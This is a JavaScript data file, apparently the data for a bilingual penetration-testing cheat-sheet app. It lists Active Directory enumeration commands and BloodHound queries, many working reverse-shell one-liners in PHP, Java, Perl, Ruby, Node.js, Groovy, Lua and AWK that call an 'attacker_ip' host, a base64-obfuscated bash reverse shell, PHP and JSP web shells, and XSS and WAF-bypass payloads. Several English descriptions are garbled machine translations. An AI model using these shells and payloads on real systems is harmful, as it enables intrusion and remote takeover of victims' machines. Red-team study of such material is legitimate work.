        syntaxBreakdown: [
          { part: 'ldap', explanation: { zh: '使用LDAP协议连接', en: 'UseLDAPProtocolConnection' }, type: 'parameter' },
          { part: '-s', explanation: { zh: 'LDAP服务器地址', en: 'LDAP ServerAddress' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '组和GPO', en: 'Groups and GPOs' },
        command: 'ldeep ldap -u user -p pass -d domain.com -s dc_ip groups\nldeep ldap -u user -p pass -d domain.com -s dc_ip gpo',
        description: { zh: '枚举组和组策略对象', en: 'EnumerationGroups and Group Policy for Object' },
        platform: 'all'
      },
      {
        name: { zh: '委派查询', en: 'Delegation Query' },
        command: 'ldeep ldap -u user -p pass -d domain.com -s dc_ip delegations\nldeep ldap -u user -p pass -d domain.com -s dc_ip trusts',
        description: { zh: '查询委派配置和域信任关系', en: 'Query delegation configuration and domain trust relationships' },
        platform: 'all'
      },
      {
        name: { zh: '密码策略', en: 'Password Policy' },
        command: 'ldeep ldap -u user -p pass -d domain.com -s dc_ip pso\nldeep ldap -u user -p pass -d domain.com -s dc_ip pass-pols',
        description: { zh: '查询密码策略', en: 'QueryPassword Policy' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/franc-pentest/ldeep']
  },
  {
    id: 'bloodhound-cypher',
    name: 'BloodHound Cypher',
    description: { zh: 'BloodHound Neo4j Cypher查询语句集合', en: 'BloodHound Neo4j Cypher query collection' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      {
        name: { zh: '查找域管路径', en: 'Find Domain Admin Path' },
        command: 'MATCH p=shortestPath((n:User {name:"USER@DOMAIN.COM"})-[*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.COM"})) RETURN p',
        description: { zh: '查找指定用户到域管的最短攻击路径', en: 'Find the shortest attack path from a specified user to Domain Admin' },
        platform: 'all'
      },
      {
        name: { zh: 'Kerberoastable用户', en: 'Kerberoastable Users' },
        command: 'MATCH (u:User {hasspn:true}) WHERE NOT u.name STARTS WITH "KRBTGT" RETURN u.name, u.serviceprincipalnames',
        description: { zh: '查找可进行Kerberoasting的用户', en: 'FindCan perform Kerberoasting Users' },
        platform: 'all'
      },
      {
        name: { zh: '不需要预认证', en: 'No Pre-auth Required' },
        command: 'MATCH (u:User {dontreqpreauth:true}) RETURN u.name',
        description: { zh: '查找可进行AS-REP Roasting的用户', en: 'FindCan perform AS-REP Roasting Users' },
        platform: 'all'
      },
      {
        name: { zh: '本地管理员', en: 'Local Admins' },
        command: 'MATCH p=(u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name',
        description: { zh: '查找所有具有本地管理员权限的用户', en: 'FindallhasLocal AdminsPermission Users' },
        platform: 'all'
      },
      {
        name: { zh: '无约束委派', en: 'Unconstrained Delegation' },
        command: 'MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name',
        description: { zh: '查找配置了无约束委派的计算机', en: 'FindConfiguration Unconstrained Delegation Computers' },
        platform: 'all'
      },
      {
        name: { zh: 'ACL滥用', en: 'ACL Abuse' },
        command: 'MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword*1..]->(target) WHERE NOT u.name STARTS WITH "KRBTGT" RETURN p',
        description: { zh: '查找可利用的ACL权限关系', en: 'Find exploitable ACL permission relationships' },
        platform: 'all'
      }
    ],
    references: ['https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/']
  },
  {
    id: 'php-reverse',
    name: { zh: 'PHP反弹Shell', en: 'PHP Reverse Shell' },
    description: { zh: 'PHP语言反弹Shell命令集合', en: 'PHP reverse shell command collection' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: 'exec方式', en: 'exec Method' },
        command: 'php -r \'$sock=fsockopen("attacker_ip",4444);exec("sh <&3 >&3 2>&3");\'',
        description: { zh: '使用exec函数反弹Shell', en: 'UseexecFunctionReverse Shell' },
        syntaxBreakdown: [
          { part: 'fsockopen', explanation: { zh: '创建TCP连接', en: 'CreateTCPConnection' }, type: 'command' },
          { part: 'exec', explanation: { zh: '执行系统命令', en: 'ExecuteSystem Commands' }, type: 'command' },
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'proc_open方式', en: 'proc_open Method' },
        command: 'php -r \'$sock=fsockopen("attacker_ip",4444);$proc=proc_open("sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\'',
        description: { zh: '使用proc_open创建交互式Shell', en: 'Create an interactive shell using proc_open' },
        platform: 'linux'
      },
      {
        name: { zh: 'Web Shell一句话', en: 'Web Shell One-Liner' },
        command: '<?php system($_GET["cmd"]); ?>\n<?php echo shell_exec($_REQUEST["cmd"]); ?>\n<?php eval($_POST["cmd"]); ?>',
        description: { zh: '常用PHP一句话木马(仅用于安全测试)', en: 'Common PHP web shell one-liner (for security testing only)' },
        platform: 'all'
      },
      {
        name: { zh: 'PentestMonkey版', en: 'PentestMonkey Version' },
        command: '# 下载完整PHP反弹Shell:\n# https://github.com/pentestmonkey/php-reverse-shell\n# 修改$ip和$port后上传执行',
        description: { zh: '功能完整的PHP反弹Shell脚本', en: 'Functioncomplete PHP Reverse ShellScript' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/pentestmonkey/php-reverse-shell']
  },
  {
    id: 'java-reverse',
    name: { zh: 'Java反弹Shell', en: 'Java Reverse Shell' },
    description: { zh: 'Java语言反弹Shell命令集合', en: 'Java reverse shell command collection' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: 'Runtime方式', en: 'Runtime Method' },
        command: 'Runtime rt = Runtime.getRuntime();\nString[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"};\nrt.exec(cmd);',
        description: { zh: 'Java Runtime执行反弹Shell', en: 'Java RuntimeExecuteReverse Shell' },
        platform: 'linux'
      },
      {
        name: { zh: 'Base64编码版', en: 'Base64 Encoded Version' },
        command: 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlcl9pcC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}',
        description: { zh: '用于Payload注入时避免特殊字符问题', en: 'Avoids special character issues during payload injection' },
        syntaxBreakdown: [
          { part: '{echo,BASE64}', explanation: { zh: '输出Base64编码的命令', en: 'OutputBase64 Encoding Command' }, type: 'command' },
          { part: '{base64,-d}', explanation: { zh: '解码Base64', en: 'DecodingBase64' }, type: 'command' },
          { part: '{bash,-i}', explanation: { zh: '执行解码后的命令', en: 'ExecuteDecodingAfter Command' }, type: 'command' },
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'JSP反弹Shell', en: 'JSP Reverse Shell' },
        command: '<%@page import="java.util.*,java.io.*"%>\n<%\nProcess p=Runtime.getRuntime().exec("bash -c {echo,ENCODED_CMD}|{base64,-d}|{bash,-i}");\n%>',
        description: { zh: 'JSP Web Shell方式', en: 'JSP Web ShellMethod' },
        platform: 'linux'
      }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'perl-reverse',
    name: { zh: 'Perl反弹Shell', en: 'Perl Reverse Shell' },
    description: { zh: 'Perl语言反弹Shell命令', en: 'Perl reverse shell commands' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: '标准反弹', en: 'Standard Reverse' },
        command: 'perl -e \'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};\'',
        description: { zh: 'Perl标准反弹Shell', en: 'Standard Perl reverse shell' },
        platform: 'all'
      },
      {
        name: { zh: 'Perl无fork', en: 'Perl No-fork' },
        command: 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attacker_ip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
        description: { zh: 'Perl IO模块方式', en: 'Perl IOModuleMethod' },
        platform: 'linux'
      }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'ruby-reverse',
    name: { zh: 'Ruby反弹Shell', en: 'Ruby Reverse Shell' },
    description: { zh: 'Ruby语言反弹Shell命令', en: 'Ruby reverse shell commands' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: '标准反弹', en: 'Standard Reverse' },
        command: 'ruby -rsocket -e\'f=TCPSocket.open("attacker_ip",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        description: { zh: 'Ruby标准反弹Shell', en: 'Standard Ruby reverse shell' },
        syntaxBreakdown: [
          { part: '-rsocket', explanation: { zh: '加载Socket库', en: 'LoadSocketdatabase' }, type: 'parameter' },
          { part: 'TCPSocket.open', explanation: { zh: '创建TCP连接', en: 'CreateTCPConnection' }, type: 'command' },
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'Windows版', en: 'Windows Version' },
        command: 'ruby -rsocket -e \'c=TCPSocket.new("attacker_ip",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'',
        description: { zh: 'Windows兼容版本', en: 'Windows-compatible version' },
        platform: 'windows'
      }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'nodejs-reverse',
    name: { zh: 'Node.js反弹Shell', en: 'Node.js Reverse Shell' },
    description: { zh: 'Node.js语言反弹Shell命令', en: 'Node.js reverse shell commands' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: '标准反弹', en: 'Standard Reverse' },
        command: 'node -e \'(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("sh",[]);var client=new net.Socket();client.connect(4444,"attacker_ip",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();\'',
        description: { zh: 'Node.js标准反弹Shell', en: 'Standard Node.js reverse shell' },
        syntaxBreakdown: [
          { part: 'net.Socket()', explanation: { zh: '创建TCP Socket连接', en: 'CreateTCP SocketConnection' }, type: 'command' },
          { part: 'child_process.spawn', explanation: { zh: '创建子进程执行Shell', en: 'CreateSub-ProcessExecuteShell' }, type: 'command' },
        ],
        platform: 'all'
      },
      {
        name: { zh: 'require方式', en: 'require Method' },
        command: 'require("child_process").exec("bash -c \'bash -i >& /dev/tcp/attacker_ip/4444 0>&1\'")',
        description: { zh: '简短版本(适用于eval注入)', en: 'Short version (suitable for eval injection)' },
        platform: 'linux'
      }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'groovy-reverse',
    name: { zh: 'Groovy反弹Shell', en: 'Groovy Reverse Shell' },
    description: { zh: 'Groovy语言反弹Shell(常用于Jenkins)', en: 'Groovy reverse shell (commonly used in Jenkins)' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: '标准反弹', en: 'Standard Reverse' },
        command: 'String host="attacker_ip";\nint port=4444;\nString cmd="/bin/bash";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};\np.destroy();s.close();',
        description: { zh: 'Groovy完整反弹Shell(用于Jenkins Script Console)', en: 'GroovycompleteReverse Shell( used for Jenkins Script Console)' },
        platform: 'all'
      },
      {
        name: { zh: '简短版', en: 'Short Version' },
        command: '"bash -c {echo,ENCODED_CMD}|{base64,-d}|{bash,-i}".execute()',
        description: { zh: '简短版(Base64编码命令)', en: 'Short Version(Base64 EncodingCommand)' },
        platform: 'linux'
      }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'lua-reverse',
    name: { zh: 'Lua反弹Shell', en: 'Lua Reverse Shell' },
    description: { zh: 'Lua语言反弹Shell命令', en: 'Lua reverse shell commands' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: '标准反弹', en: 'Standard Reverse' },
        command: 'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'attacker_ip\',\'4444\');os.execute(\'sh -i <&3 >&3 2>&3\');"',
        description: { zh: 'Lua Socket库反弹Shell', en: 'Lua SocketdatabaseReverse Shell' },
        platform: 'linux'
      },
      {
        name: { zh: 'Lua5.1版', en: 'Lua 5.1 Version' },
        command: 'lua5.1 -e \'local host, port = "attacker_ip", 4444 local socket = require("socket") local tcp = socket.tcp() tcp:connect(host, port) while true do local cmd, status = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\'',
        description: { zh: 'Lua 5.1兼容版本', en: 'Lua 5.1 compatible version' },
        platform: 'linux'
      }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'awk-reverse',
    name: { zh: 'AWK反弹Shell', en: 'AWK Reverse Shell' },
    description: { zh: 'AWK语言反弹Shell命令', en: 'AWK reverse shell commands' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      {
        name: { zh: '标准反弹', en: 'Standard Reverse' },
        command: 'awk \'BEGIN {s = "/inet/tcp/0/attacker_ip/4444"; while(42) { do{ printf "shell> " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null',
        description: { zh: 'AWK网络功能反弹Shell', en: 'AWKNetworkFunctionReverse Shell' },
        syntaxBreakdown: [
          { part: '/inet/tcp/0/', explanation: { zh: 'AWK内置TCP连接', en: 'AWK built-in TCP connection' }, type: 'command' },
          { part: 'attacker_ip/4444', explanation: { zh: '目标地址和端口', en: 'TargetAddress and Port' }, type: 'value' },
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'GAWK版', en: 'GAWK Version' },
        command: 'gawk \'BEGIN{s="/inet/tcp/0/attacker_ip/4444";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit");close(s)}}\'',
        description: { zh: 'GNU AWK简化版', en: 'Simplified GNU AWK version' },
        platform: 'linux'
      }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'base64-encode',
    name: { zh: 'Base64编码', en: 'Base64 Encoding' },
    description: { zh: 'Base64编码/解码命令集合', en: 'Base64 encoding/decoding command collection' },
    category: { zh: '编码解码', en: 'Encoding/Decoding' },
    commands: [
      {
        name: { zh: '编码', en: 'Encoding' },
        command: '# Linux:\necho -n "payload" | base64\nbase64 file.txt > encoded.txt\n\n# Windows PowerShell:\n[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("payload"))\n\n# Python:\npython3 -c "import base64; print(base64.b64encode(b\'payload\').decode())"',
        description: { zh: '各平台Base64编码方法', en: 'EachPlatformBase64 EncodingMethod' },
        platform: 'all'
      },
      {
        name: { zh: '解码', en: 'Decoding' },
        command: '# Linux:\necho "cGF5bG9hZA==" | base64 -d\nbase64 -d encoded.txt > decoded.txt\n\n# Windows PowerShell:\n[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("cGF5bG9hZA=="))\n\n# Python:\npython3 -c "import base64; print(base64.b64decode(\'cGF5bG9hZA==\').decode())"',
        description: { zh: '各平台Base64解码方法', en: 'EachPlatformBase64DecodingMethod' },
        platform: 'all'
      },
      {
        name: { zh: 'URL安全Base64', en: 'URL-Safe Base64' },
        command: '# Python:\nimport base64\nbase64.urlsafe_b64encode(b"payload").decode()\nbase64.urlsafe_b64decode("cGF5bG9hZA==").decode()',
        description: { zh: 'URL安全的Base64编码(+/替换为-_)', en: 'URLSecurity Base64 Encoding(+/Replace is -_)' },
        platform: 'all'
      }
    ]
  },
  {
    id: 'url-encode',
    name: { zh: 'URL编码', en: 'URL Encoding' },
    description: { zh: 'URL编码/解码命令集合', en: 'URL encoding/decoding command collection' },
    category: { zh: '编码解码', en: 'Encoding/Decoding' },
    commands: [
      {
        name: { zh: '编码', en: 'Encoding' },
        command: '# Python:\npython3 -c "from urllib.parse import quote; print(quote(\'<script>alert(1)</script>\'))"\n\n# 双重编码:\npython3 -c "from urllib.parse import quote; print(quote(quote(\'<script>alert(1)</script>\')))"\n\n# CyberChef在线: https://gchq.github.io/CyberChef/',
        description: { zh: 'URL编码方法(单次/双重)', en: 'URL EncodingMethod(Singletimes/Double)' },
        platform: 'all'
      },
      {
        name: { zh: '解码', en: 'Decoding' },
        command: '# Python:\npython3 -c "from urllib.parse import unquote; print(unquote(\'%3Cscript%3Ealert(1)%3C%2Fscript%3E\'))"\n\n# Linux:\nprintf \'%b\' "\\x3Cscript\\x3E"',
        description: { zh: 'URL解码方法', en: 'URLDecodingMethod' },
        platform: 'all'
      }
    ]
  },
  {
    id: 'hex-encode',
    name: { zh: 'Hex编码', en: 'Hex Encoding' },
    description: { zh: '十六进制编码/解码命令集合', en: 'Hexadecimal encoding/decoding command collection' },
    category: { zh: '编码解码', en: 'Encoding/Decoding' },
    commands: [
      {
        name: { zh: '编码', en: 'Encoding' },
        command: '# Linux:\necho -n "payload" | xxd -p\necho -n "payload" | od -A n -t x1 | tr -d " \\n"\n\n# Python:\npython3 -c "print(\'payload\'.encode().hex())"\npython3 -c "print(\'\\\\x\'.join([hex(ord(c))[2:] for c in \'payload\']))"',
        description: { zh: '十六进制编码方法', en: 'hexadecimalEncodingMethod' },
        platform: 'all'
      },
      {
        name: { zh: '解码', en: 'Decoding' },
        command: '# Linux:\necho "7061796c6f6164" | xxd -r -p\n\n# Python:\npython3 -c "print(bytes.fromhex(\'7061796c6f6164\').decode())"',
        description: { zh: '十六进制解码方法', en: 'hexadecimalDecodingMethod' },
        platform: 'all'
      },
      {
        name: { zh: 'Hex转义', en: 'Hex Escape' },
        command: '# SQL注入中使用:\nSELECT 0x61646D696E  -- "admin"\n\n# XSS中使用:\n<img src=x onerror=\\x61\\x6c\\x65\\x72\\x74(1)>',
        description: { zh: '在SQL注入和XSS中使用十六进制编码', en: 'in SQLInjection and XSSMiddleUsehexadecimalEncoding' },
        platform: 'all'
      }
    ]
  },
  {
    id: 'html-encode',
    name: { zh: 'HTML编码', en: 'HTML Encoding' },
    description: { zh: 'HTML实体编码/解码命令集合', en: 'HTML entity encoding/decoding command collection' },
    category: { zh: '编码解码', en: 'Encoding/Decoding' },
    commands: [
      {
        name: { zh: '编码', en: 'Encoding' },
        command: '# Python:\npython3 -c "import html; print(html.escape(\'<script>alert(1)</script>\'))"\n\n# 数字编码:\npython3 -c "print(\'\'.join([\'&#\'+str(ord(c))+\';\' for c in \'<script>alert(1)</script>\']))"\n\n# 十六进制HTML编码:\npython3 -c "print(\'\'.join([\'&#x\'+hex(ord(c))[2:]+\';\' for c in \'alert\']))"',
        description: { zh: 'HTML实体编码(命名/十进制/十六进制)', en: 'HTML entity encoding (named/decimal/hexadecimal)' },
        platform: 'all'
      },
      {
        name: { zh: '解码', en: 'Decoding' },
        command: '# Python:\npython3 -c "import html; print(html.unescape(\'&lt;script&gt;alert(1)&lt;/script&gt;\'))"',
        description: { zh: 'HTML实体解码', en: 'HTMLEntityDecoding' },
        platform: 'all'
      },
      {
        name: { zh: '常用实体', en: 'Common Entities' },
        command: '# 常用HTML实体:\n# < => &lt; 或 &#60; 或 &#x3c;\n# > => &gt; 或 &#62; 或 &#x3e;\n# " => &quot; 或 &#34; 或 &#x22;\n# \' => &apos; 或 &#39; 或 &#x27;\n# & => &amp; 或 &#38; 或 &#x26;',
        description: { zh: 'XSS绕过常用的HTML实体对照', en: 'Common HTML entity reference for XSS bypass' },
        platform: 'all'
      }
    ]
  },
  {
    id: 'unicode-encode',
    name: { zh: 'Unicode编码', en: 'Unicode Encoding' },
    description: { zh: 'Unicode编码/解码命令集合', en: 'Unicode encoding/decoding command collection' },
    category: { zh: '编码解码', en: 'Encoding/Decoding' },
    commands: [
      {
        name: { zh: '编码', en: 'Encoding' },
        command: '# Python Unicode转义:\npython3 -c "print(\'\'.join([\'\\\\u\'+hex(ord(c))[2:].zfill(4) for c in \'alert\']))"\n# 输出: \\u0061\\u006c\\u0065\\u0072\\u0074\n\n# UTF-8字节:\npython3 -c "print(\'alert\'.encode(\'utf-8\'))"',
        description: { zh: 'Unicode各种编码形式', en: 'Various Unicode encoding formats' },
        platform: 'all'
      },
      {
        name: { zh: '解码', en: 'Decoding' },
        command: '# Python:\npython3 -c "print(\'\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074\'.encode().decode(\'unicode_escape\'))"\n\n# JavaScript:\nconsole.log("\\u0061\\u006c\\u0065\\u0072\\u0074")',
        description: { zh: 'Unicode解码方法', en: 'UnicodeDecodingMethod' },
        platform: 'all'
      },
      {
        name: { zh: 'WAF绕过用法', en: 'WAF Bypass Usage' },
        command: '# JavaScript Unicode绕过:\n<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>\n\n# Overlong UTF-8编码:\n# / => %c0%af (可绕过路径过滤)\n# . => %c0%ae',
        description: { zh: '使用Unicode编码绕过WAF/过滤', en: 'UseUnicode EncodingBypass WAF/Filter' },
        platform: 'all'
      }
    ]
  },
  {
    id: 'jwt-decode',
    name: { zh: 'JWT解码', en: 'JWT Decode' },
    description: { zh: 'JWT(JSON Web Token)解码和分析工具', en: 'JWT(JSON Web Token)Decoding and AnalyzeTools' },
    category: { zh: '编码解码', en: 'Encoding/Decoding' },
    commands: [
      {
        name: { zh: '在线解码', en: 'Online Decode' },
        command: '# 在线工具:\n# https://jwt.io\n# https://token.dev\n# 粘贴JWT即可查看Header和Payload',
        description: { zh: '使用在线工具解码JWT', en: 'Decode JWT using online tools' },
        platform: 'all'
      },
      {
        name: { zh: '命令行解码', en: 'Command Line Decode' },
        command: '# Python:\npython3 -c "\nimport base64, json, sys\ntoken = sys.argv[1]\nparts = token.split(\'.\')\nfor i, part in enumerate(parts[:2]):\n    padded = part + \'=\' * (4 - len(part) % 4)\n    decoded = base64.urlsafe_b64decode(padded)\n    print(json.dumps(json.loads(decoded), indent=2))\n" YOUR_JWT_HERE',
        description: { zh: '使用Python命令行解码JWT', en: 'UsePythonCommand Line DecodeJWT' },
        platform: 'all'
      },
      {
        name: { zh: '结构分析', en: 'Structure Analysis' },
        command: '# JWT结构: Header.Payload.Signature\n# Header: {"alg":"HS256","typ":"JWT"}\n# Payload: {"sub":"1234","name":"user","iat":1516239022}\n# Signature: HMACSHA256(base64url(header)+"."+base64url(payload), secret)\n\n# 检查要点:\n# 1. alg是否可改为none\n# 2. 密钥是否为弱密码\n# 3. 是否可将RS256改为HS256\n# 4. exp是否已过期',
        description: { zh: 'JWT结构分析和安全检查要点', en: 'JWTStructure Analysis and SecurityCheckNeedpoint' },
        platform: 'all'
      }
    ],
    references: ['https://jwt.io']
  }
];

export default toolCommands;
